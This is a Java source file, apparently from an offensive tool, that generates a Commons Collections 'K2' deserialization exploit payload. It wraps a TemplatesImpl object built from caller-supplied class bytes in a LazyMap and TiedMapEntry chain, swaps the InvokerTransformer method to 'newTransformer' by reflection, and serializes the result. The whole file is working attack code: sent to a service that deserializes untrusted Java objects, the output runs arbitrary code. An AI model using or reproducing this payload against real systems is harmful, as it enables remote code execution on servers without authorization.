package cn.safe6.payload;

import cn.safe6.util.Gadgets;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsK2 {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getPayload(byte[] clazzBytes) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(clazzBytes);
        // mock method name until armed
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<String, String>();
       // Map m = LazyMap.decorate(innerMap, transformer);
        Map m = LazyMap.lazyMap(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, templates);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        setFieldValue(transformer, "iMethodName", "newTransformer");
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(outerMap);
        oos.close();

        return barr.toByteArray();
    }

}
